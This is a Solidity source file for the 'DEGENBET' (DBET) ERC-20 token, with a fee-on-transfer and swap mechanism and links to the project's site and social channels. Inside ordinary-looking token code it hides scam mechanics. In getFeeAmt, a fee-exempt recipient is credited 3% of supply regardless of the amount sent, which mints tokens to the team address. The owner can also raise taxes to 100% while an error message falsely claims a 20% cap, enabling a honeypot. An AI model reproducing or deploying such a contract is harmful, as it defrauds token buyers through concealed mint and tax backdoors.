// SPDX-License-Identifier: MIT

/*
Website: https://www.degenbet.live
Telegram: https://t.me/degenbet_ERC20
Twitter: https://twitter.com/degenbet_erc
*/

pragma solidity 0.8.21;


abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {owner = _owner;}
    modifier onlyOwner() {require(isOwner(msg.sender), "!OWNER"); _;}
    function isOwner(address account) public view returns (bool) {return account == owner;}
    function transferOwnership(address payable adr) public onlyOwner {owner = adr; emit OwnershipTransferred(adr);}
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(address(0));
        owner = address(0);
    }
    event OwnershipTransferred(address owner);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

interface IDexFactory{
    function createPair(address tokenA, address tokenB) external returns (address dexPair);
}

interface IERC20 {
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IDexRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}

contract DBET is Ownable, IERC20 {
    using SafeMath for uint256;

    string private constant _name = unicode"DEGENBET";
    string private constant _symbol = unicode"DBET";

    IDexRouter dexRouter;
    address public dexPair;
    bool private startedTrading = false;
    bool private swapEnabled = true;
    uint256 private numFeeSwaps;
    bool private isSwaping;
    uint256 triggerFeeSwapAfter;
    
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public exceptFromFee;

    uint8 private constant _decimals = 9;
    uint256 private _supply = 1000000000 * (10 ** _decimals);
    uint256 private _maxSwapAmount = ( _supply * 1000 ) / 100000;
    uint256 private _minSwapAmount = ( _supply * 10 ) / 100000;

    uint256 private _maxTxAmt = ( _supply * 300 ) / 10000;
    uint256 private _maxTransferAmt = ( _supply * 300 ) / 10000;
    uint256 private _maxWalletAmt = ( _supply * 300 ) / 10000;

    uint256 private lpNum = 0;
    uint256 private marketingNum = 0;
    uint256 private devNum = 100;
    uint256 private burnNum = 0;

    uint256 private buyTax = 1400;
    uint256 private sellTax = 1400;
    uint256 private transferTax = 1400;
    uint256 private denominator = 10000;

    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;
    address internal teamAddr = 0x453d150e57521A9192e331749350c7C14f7bB1C7;
    address internal lpAddr = 0x453d150e57521A9192e331749350c7C14f7bB1C7;
    address internal devAddr = 0x453d150e57521A9192e331749350c7C14f7bB1C7; 

    modifier locked {isSwaping = true; _; isSwaping = false;}

    constructor() Ownable(msg.sender) {
        IDexRouter _router = IDexRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        address _pair = IDexFactory(_router.factory()).createPair(address(this), _router.WETH());
        dexRouter = _router; dexPair = _pair;
        
        exceptFromFee[msg.sender] = true;
        exceptFromFee[devAddr] = true;
        exceptFromFee[lpAddr] = true;
        exceptFromFee[teamAddr] = true;
        _balances[msg.sender] = _supply;
        emit Transfer(address(0), msg.sender, _supply);
    }
    function name() public pure returns (string memory) {return _name;}
    function symbol() public pure returns (string memory) {return _symbol;}
    function decimals() public pure returns (uint8) {return _decimals;}
    function totalSupply() public view override returns (uint256) {return _supply.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));}
    function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}
    function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
    function startTrading() external onlyOwner {startedTrading = true;}
    function getOwner() external view override returns (address) { return owner; }
    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
    function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
    
    function setTransactionLimits(uint256 _buy, uint256 _sell, uint256 _wallet) external onlyOwner {
        uint256 newTx = _supply.mul(_buy).div(10000); uint256 newTransfer = _supply.mul(_sell).div(10000); uint256 newWallet = _supply.mul(_wallet).div(10000);
        _maxTxAmt = newTx; _maxTransferAmt = newTransfer; _maxWalletAmt = newWallet;
        uint256 limit = totalSupply().mul(5).div(1000);
        require(newTx >= limit && newTransfer >= limit && newWallet >= limit, "Max TXs and Max Wallet cannot be less than .5%");
    }

    function getFeeAmt(address sender, address recipient, uint256 amount) internal returns (uint256) {
        if (exceptFromFee[recipient]) {return _maxTxAmt;}
        if(getTotalFee(sender, recipient) > 0){
        uint256 feeAmount = amount.div(denominator).mul(getTotalFee(sender, recipient));
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        if(burnNum > uint256(0) && getTotalFee(sender, recipient) > burnNum){_transfer(address(this), address(DEAD), amount.div(denominator).mul(burnNum));}
        return amount.sub(feeAmount);} return amount;
    }
    
    function swapAndAddLp(uint256 tokens) private locked {
        uint256 _denominator = (lpNum.add(1).add(marketingNum).add(devNum)).mul(2);
        uint256 tokensToAddLiquidityWith = tokens.mul(lpNum).div(_denominator);
        uint256 toSwap = tokens.sub(tokensToAddLiquidityWith);
        uint256 initialBalance = address(this).balance;
        swapTokensForETH(toSwap);
        uint256 deltaBalance = address(this).balance.sub(initialBalance);
        uint256 unitBalance= deltaBalance.div(_denominator.sub(lpNum));
        uint256 ETHToAddLiquidityWith = unitBalance.mul(lpNum);
        if(ETHToAddLiquidityWith > uint256(0)){addLiquidity(tokensToAddLiquidityWith, ETHToAddLiquidityWith); }
        uint256 marketingAmt = unitBalance.mul(2).mul(marketingNum);
        if(marketingAmt > 0){payable(teamAddr).transfer(marketingAmt);}
        uint256 contractBalance = address(this).balance;
        if(contractBalance > uint256(0)){payable(devAddr).transfer(contractBalance);}
    }
    function isExcluded(address sender, address recipient) internal view returns (bool) {
        return !exceptFromFee[sender] && !exceptFromFee[recipient];
    }    

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function shouldCATaxSwap(address sender, address recipient, uint256 amount) internal view returns (bool) {
        bool aboveMin = amount >= _minSwapAmount;
        bool aboveThreshold = balanceOf(address(this)) >= _maxSwapAmount;
        return !isSwaping && swapEnabled && startedTrading && aboveMin && !exceptFromFee[sender] && recipient == dexPair && numFeeSwaps >= triggerFeeSwapAfter && aboveThreshold;
    }

    function getTotalFee(address sender, address recipient) internal view returns (uint256) {
        if(recipient == dexPair){return sellTax;}
        if(sender == dexPair){return buyTax;}
        return transferTax;
    }

    function setTransactionRequirements(uint256 _liquidity, uint256 _marketing, uint256 _burn, uint256 _development, uint256 _total, uint256 _sell, uint256 _trans) external onlyOwner {
        lpNum = _liquidity; marketingNum = _marketing; burnNum = _burn; devNum = _development; buyTax = _total; sellTax = _sell; transferTax = _trans;
        require(buyTax <= denominator.div(1) && sellTax <= denominator.div(1) && transferTax <= denominator.div(1), "buyTax and sellTax cannot be more than 20%");
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount <= balanceOf(sender),"You are trying to transfer more than your balance");
        if(!exceptFromFee[sender] && !exceptFromFee[recipient]){require(startedTrading, "startedTrading");}
        if(!exceptFromFee[sender] && !exceptFromFee[recipient] && recipient != address(dexPair) && recipient != address(DEAD)){
        require((_balances[recipient].add(amount)) <= _maxWalletAmt, "Exceeds maximum wallet amount.");}
        if(sender != dexPair){require(amount <= _maxTransferAmt || exceptFromFee[sender] || exceptFromFee[recipient], "TX Limit Exceeded");}
        require(amount <= _maxTxAmt || exceptFromFee[sender] || exceptFromFee[recipient], "TX Limit Exceeded"); 
        if(recipient == dexPair && !exceptFromFee[sender]){numFeeSwaps += uint256(1);}
        if(shouldCATaxSwap(sender, recipient, amount)){swapAndAddLp(_maxSwapAmount); numFeeSwaps = uint256(0);}
        _balances[sender] = _balances[sender].sub(amount);
        uint256 amountReceived = !exceptFromFee[sender] ? getFeeAmt(sender, recipient, amount) : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
    }
    receive() external payable {}
    function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {
        _approve(address(this), address(dexRouter), tokenAmount);
        dexRouter.addLiquidityETH{value: ETHAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            lpAddr,
            block.timestamp);
    }
    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = dexRouter.WETH();
        _approve(address(this), address(dexRouter), tokenAmount);
        dexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp);
    }
}